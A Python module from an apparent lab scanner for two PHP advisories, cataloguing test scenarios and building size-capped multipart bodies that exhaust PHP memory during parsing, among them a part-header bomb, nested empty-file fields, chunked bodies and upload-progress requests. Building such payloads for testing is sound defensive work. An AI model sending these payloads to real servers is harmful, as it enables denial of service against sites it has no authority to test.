"""Scenario catalogue and payload builders.

Every scenario declares its producer and consumer explicitly.  Payload sizes
are bounded and builders are pure functions of a per-run nonce so evidence can
be reproduced from the recorded parameters.

No exploit payload and no arbitrary command execution live here.  A lab may
provide its own harness endpoint; the scanner only drives and records it.
"""

from __future__ import annotations

from typing import Any, Dict, List, Optional

from .models import ScenarioDefinition
from .util import new_nonce
from .version import CVE_618, CVE_619

DEFAULT_NESTED_DEPTH = 8
DEFAULT_EMPTY_FILES = 1200
DEFAULT_PART_HEADERS = 5000
DEFAULT_HEADER_SIZE = 400
DEFAULT_UNDECLARED_MIB = 2
MAX_BUILT_BODY = 8 * 1024 * 1024


SCENARIOS: Dict[str, ScenarioDefinition] = {
    "618-S1": ScenarioDefinition(
        id="618-S1",
        cve=CVE_618,
        title="Multipart body without a usable declared content length",
        sapi_applicability=["mod_php", "fpm", "frankenphp", "lsapi"],
        producer="HTTP request carrying a chunked multipart body (no Content-Length).",
        consumer="None for 109618; the request itself reaches request startup/shutdown.",
        description=(
            "Advisory OOM strategy 1: a multipart request without a usable declared "
            "content length can pass the initial post_max_size check and continue "
            "supplying decoded body data.  The body is chunked and bounded."
        ),
        impact="May exhaust PHP memory during input parsing; does not by itself prove the invalid-state path.",
        max_requests=1,
        notes=["Chunked transfer encoding is used so no Content-Length is declared."],
    ),
    "618-S2": ScenarioDefinition(
        id="618-S2",
        cve=CVE_618,
        title="Unrestricted headers inside a single multipart part",
        sapi_applicability=["mod_php", "fpm", "frankenphp", "lsapi"],
        producer="HTTP multipart request with thousands of headers in one part.",
        consumer="None for 109618; request startup/shutdown processes the part.",
        description=(
            "Advisory OOM strategy 2: a multipart part may contain an unrestricted "
            "number of headers; PHP's in-memory representation can consume much more "
            "than the wire bytes and exhaust memory_limit while the request is still "
            "within post_max_size."
        ),
        impact="Parsing-time memory amplification. OOM observed is not proof of CVE-2026-109618.",
        max_requests=1,
    ),
    "618-S3": ScenarioDefinition(
        id="618-S3",
        cve=CVE_618,
        title="Empty file controls with nested field names",
        sapi_applicability=["mod_php", "fpm", "frankenphp", "lsapi"],
        producer="HTTP multipart request with many empty-file parts and nested names.",
        consumer="None for 109618; request startup/shutdown processes the parts.",
        description=(
            "Advisory OOM strategy 3: empty file controls do not count towards "
            "max_file_uploads but still create file metadata; nested field names "
            "multiply the generated array work."
        ),
        impact="Parsing-time array amplification. OOM observed is not proof of CVE-2026-109618.",
        max_requests=1,
    ),
    "618-S4": ScenarioDefinition(
        id="618-S4",
        cve=CVE_618,
        title="Application/extension OOM on a reachable fixture endpoint",
        sapi_applicability=["mod_php", "fpm", "frankenphp", "lsapi"],
        producer="Application fixture allocates attacker-controlled input until OOM.",
        consumer="None for 109618; the resulting shutdown is the object of study.",
        description=(
            "Advisory notes OOM can be reached in application-specific ways.  This "
            "scenario only runs when the operator supplies a lab fixture endpoint and "
            "the multipart field it consumes.  It can demonstrate OOM in application "
            "code, never by itself the 109618 invalid-state path."
        ),
        impact="Application-level OOM observation with its own alternative explanations.",
        requires=["app_oom_endpoint", "app_oom_field"],
        max_requests=1,
        notes=["Disabled by default unless both fixture arguments are supplied."],
    ),
    "619-S1": ScenarioDefinition(
        id="619-S1",
        cve=CVE_619,
        title="Fatal backtrace producer + pre-initialisation INI diagnostic consumer",
        sapi_applicability=["mod_php"],
        producer="Request that stores request-owned fatal backtrace state and is interrupted.",
        consumer="Later request whose pre-initialisation INI diagnostic reads stale error state.",
        description=(
            "Advisory's strongest confirmed case (PHP 8.5 fatal_error_backtraces). "
            "Requires an operator-provided lab harness that can produce a fatal and a "
            "subsequent request whose early INI diagnostic is observable."
        ),
        impact="Conditional on a lab harness; same-worker PID correlation is mandatory.",
        requires=["producer_url", "consumer_url"],
        lab_only=True,
        max_requests=2,
    ),
    "619-S2": ScenarioDefinition(
        id="619-S2",
        cve=CVE_619,
        title="multipart OOM producer + session upload-progress consumer (mod_php)",
        sapi_applicability=["mod_php"],
        producer="Startup-time multipart OOM (618-S2 body) that publishes session/decoder state.",
        consumer="A later upload-progress request on the same worker before normal initialization.",
        description=(
            "Advisory's application-independent 619 upload-progress sequence on "
            "mod_php.  The producer body is the same bounded multipart header bomb "
            "used by 618-S2; it is executed once per scenario id."
        ),
        impact="Requires same-worker correlation and a consumer trace; OOM alone is not enough.",
        max_requests=2,
    ),
    "619-S3": ScenarioDefinition(
        id="619-S3",
        cve=CVE_619,
        title="Application execution producer + upload-progress consumer (FPM)",
        sapi_applicability=["fpm", "frankenphp", "lsapi"],
        producer="Application fixture publishes session/decoder state, then reaches a fatal error.",
        consumer="Later upload-progress request handled by the same worker.",
        description=(
            "Advisory's validated FPM path: state is published during application "
            "execution after successful startup, then a fatal error abandons the "
            "reset; a later upload-progress request consumes the stale state."
        ),
        impact="Requires a lab application producer and consumer correlation.",
        requires=["producer_url", "consumer_url"],
        lab_only=True,
        max_requests=2,
    ),
}


def scenario_list() -> List[ScenarioDefinition]:
    return [SCENARIOS[key] for key in sorted(SCENARIOS)]


def select(specs: List[str]) -> List[ScenarioDefinition]:
    """Expand suffixes such as ``618`` or ``619`` into scenario ids."""
    selected: List[ScenarioDefinition] = []
    seen = set()
    for spec in specs:
        spec = spec.strip()
        if not spec:
            continue
        if spec in SCENARIOS:
            candidates = [SCENARIOS[spec]]
        elif spec in ("618", CVE_618, "109618"):
            candidates = [SCENARIOS[key] for key in ("618-S1", "618-S2", "618-S3", "618-S4")]
        elif spec in ("619", CVE_619, "109619"):
            candidates = [SCENARIOS[key] for key in ("619-S1", "619-S2", "619-S3")]
        else:
            raise ValueError(f"unknown scenario {spec!r}")
        for item in candidates:
            if item.id not in seen:
                seen.add(item.id)
                selected.append(item)
    return selected


# ---------------------------------------------------------------------------
# Builders
# ---------------------------------------------------------------------------


def _bound(data: bytes) -> bytes:
    if len(data) > MAX_BUILT_BODY:
        raise ValueError(
            f"scenario body would be {len(data)} bytes, above the {MAX_BUILT_BODY}-byte builder cap"
        )
    return data


def build_control_multipart(nonce: str) -> bytes:
    boundary = f"P2SCTRL{nonce[-8:]}"
    return (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="p2s_control"\r\n\r\n'
        f"control-{nonce}\r\n"
        f"--{boundary}--\r\n"
    ).encode("ascii", "strict")


def control_boundary(nonce: str) -> str:
    return f"P2SCTRL{nonce[-8:]}"


def build_part_header_bomb(
    nonce: str,
    headers: int = DEFAULT_PART_HEADERS,
    header_size: int = DEFAULT_HEADER_SIZE,
    field: str = "p2s_file",
) -> bytes:
    boundary = f"P2SHDR{nonce[-8:]}"
    lines = [
        f"--{boundary}\r\n",
        f'Content-Disposition: form-data; name="{field}"; filename="p2s.bin"\r\n',
        "Content-Type: application/octet-stream\r\n",
    ]
    for index in range(headers):
        lines.append(f"X-P2S-Pad-{index:05d}: {'A' * max(1, header_size)}\r\n")
    lines.append("\r\nZ\r\n")
    lines.append(f"--{boundary}--\r\n")
    return _bound("".join(lines).encode("ascii", "strict"))


def header_bomb_boundary(nonce: str) -> str:
    return f"P2SHDR{nonce[-8:]}"


def build_empty_file_nested(
    nonce: str,
    parts: int = DEFAULT_EMPTY_FILES,
    depth: int = DEFAULT_NESTED_DEPTH,
) -> bytes:
    boundary = f"P2SNEST{nonce[-8:]}"
    chunks = []
    suffix = "".join("[a]" for _ in range(max(1, depth)))
    for index in range(parts):
        name = f"f{suffix}[{index}]"
        chunks.append(
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="{name}"; filename=""\r\n'
            f"Content-Type: application/octet-stream\r\n\r\n"
        )
    chunks.append(f"--{boundary}--\r\n")
    return _bound("".join(chunks).encode("ascii", "strict"))


def nested_boundary(nonce: str) -> str:
    return f"P2SNEST{nonce[-8:]}"


def build_undeclared_length(nonce: str, mib: int = DEFAULT_UNDECLARED_MIB) -> bytes:
    """A multipart body that will be sent chunked, with no Content-Length."""
    boundary = f"P2SCHUNK{nonce[-8:]}"
    part = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="p2s_chunk"; filename="p2s.bin"\r\n'
        f"Content-Type: application/octet-stream\r\n\r\n"
    ).encode("ascii")
    tail = f"\r\n--{boundary}--\r\n".encode("ascii")
    target = max(1, mib) << 20
    if target < len(part) + len(tail):
        target = len(part) + len(tail)
    filler = b"B" * (target - len(part) - len(tail))
    return _bound(part + filler + tail)


def chunked_boundary(nonce: str) -> str:
    return f"P2SCHUNK{nonce[-8:]}"


def build_upload_progress(nonce: str, filename: str = "p2s.bin") -> bytes:
    boundary = f"P2SUP{nonce[-8:]}"
    return (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"{nonce}\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="{filename}"\r\n'
        f"Content-Type: application/octet-stream\r\n\r\nZ\r\n"
        f"--{boundary}--\r\n"
    ).encode("ascii", "strict")


def upload_progress_boundary(nonce: str) -> str:
    return f"P2SUP{nonce[-8:]}"


def build_app_oom(nonce: str, field: str, mib: int) -> bytes:
    boundary = f"P2SAPP{nonce[-8:]}"
    payload = b"C" * (max(1, mib) << 20)
    return _bound(
        (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="{field}"\r\n\r\n'
        ).encode("ascii")
        + payload
        + f"\r\n--{boundary}--\r\n".encode("ascii")
    )


def app_oom_boundary(nonce: str) -> str:
    return f"P2SAPP{nonce[-8:]}"


def new_scenario_nonce(scenario_id: str) -> str:
    return new_nonce(f"P2S{scenario_id.replace('-', '')}")
